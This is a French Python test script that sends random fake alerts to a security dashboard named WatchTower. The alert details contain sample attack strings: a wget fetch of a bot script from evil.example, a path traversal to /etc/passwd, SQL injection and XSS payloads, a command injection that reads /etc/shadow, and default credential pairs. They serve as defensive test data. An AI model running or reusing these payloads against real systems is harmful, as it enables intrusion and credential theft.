"""
Remplit WatchTower avec de fausses alertes pour tester le dashboard
sans avoir besoin de lancer SSHTrap, LogHunter et MiniWAF.

Usage :  python send_test_alerts.py        (50 alertes)
         python send_test_alerts.py 200    (200 alertes)
"""
import random
import sys
from datetime import datetime, timedelta

from watchtower_client import send_alert

# Adresses de documentation (RFC 5737) : elles n'appartiennent à personne
IPS = [
    "203.0.113.10", "203.0.113.25", "203.0.113.77",
    "198.51.100.4", "198.51.100.42", "198.51.100.99",
    "192.0.2.8", "192.0.2.150",
]

SCENARIOS = {
    "sshtrap": [
        ("bruteforce_ssh", "high", "user=root password=123456"),
        ("bruteforce_ssh", "high", "user=admin password=admin"),
        ("ssh_command", "medium", "cmd='wget http://evil.example/bot.sh'"),
        ("ssh_login_attempt", "low", "user=pi password=raspberry"),
    ],
    "loghunter": [
        ("ssh_bruteforce_detected", "high", "42 échecs en 60 s (auth.log)"),
        ("web_scan", "medium", "Nikto détecté dans le User-Agent"),
        ("path_traversal", "high", "GET /../../etc/passwd"),
        ("404_flood", "low", "120 erreurs 404 en 2 min"),
    ],
    "miniwaf": [
        ("sqli_blocked", "high", "id=1' OR '1'='1"),
        ("xss_blocked", "medium", "q=<script>alert(1)</script>"),
        ("rate_limit", "low", "plus de 100 req/min"),
        ("rce_attempt", "critical", "cmd=;cat /etc/shadow"),
    ],
}


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 50
    ok = 0
    now = datetime.now()
    for _ in range(n):
        source = random.choice(list(SCENARIOS))
        type_, severity, details = random.choice(SCENARIOS[source])
        ip = random.choice(IPS)
        ts = now - timedelta(minutes=random.randint(0, 24 * 60))
        if send_alert(source, type_, severity, ip, details, ts.isoformat(timespec="seconds")):
            ok += 1
    print(f"{ok}/{n} alertes envoyées.")


if __name__ == "__main__":
    main()
